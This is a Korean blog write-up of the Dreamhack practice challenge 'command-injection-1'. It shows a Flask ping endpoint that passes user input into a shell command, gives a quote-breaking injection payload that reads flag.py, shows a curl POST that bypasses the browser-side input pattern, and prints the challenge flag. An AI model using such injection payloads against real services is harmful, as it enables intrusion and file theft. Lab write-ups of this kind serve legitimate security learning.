---
title: "[Dreamhack] command-injection-1 해설"
author: jyp
date: 2026-06-09 12:00:06 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> Command Injection 기법을 활용한 해킹

## **난이도**: Lv.1
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── deploy
│   ├── app.py
│   ├── flag.py
│   ├── requirements.txt
│   ├── static
│   └── templates
└── Dockerfile
```

## 주요 코드 

```python

#app.py

@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')

```

이 문제는 요청에 커맨드 명령어를 함께 넣어 해킹을 하는 문제다.


# 풀이

## CMDI (Command Injection) 이란?

**웹 앱이 사용자 입력을 OS 명령어 문자열에 그대로 끼워넣어 실행할 때, 공격자가 명령어를 조작해 임의의 시스템 명령을 실행시키는 취약점입니다.**

## 입력란에 쉘 명령어 넣기

이 문제 역시 사용자 입력을 OS명령어로 바로 실행시키는 상황이므로, 이를 이용하여 우리가 직접 쉘 명령어를 이용할 수 있을 것이다.

ping -c 3 "`8.8.8.8"; cat flag.py; #`"

=> ping -c 3 "8.8.8.8"; cat flag.py; #" (#을 통해 뒷부분 주석)

## 페이로드

`8.8.8.8"; cat flag.py; #`

## 문제 발생

```html
#ping.html

<h1>Let's ping your host</h1><br/>
<form method="POST">
  <div class="row">
    <div class="col-md-6 form-group">
      <label for="Host">Host</label>
      <input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required>
    </div>
  </div>

  <button type="submit" class="btn btn-default">Ping!</button>
</form>

```

html단위에서 형식검사를 하므로, input에 쉘 스크립트를 작동시킬 수는 없다. 하지만 이는 html, 브라우저에서 작동하는 형식검사이므로, 직접 post요청을 보내면 이러한 형식검사를 우회할 수 있다.

## 수정된 페이로드

```
curl -X POST 드림핵주소:포트/ping --data-urlencode 'host="; cat flag.py #'

```




# 정답

DH{pingpingppppppppping!!}
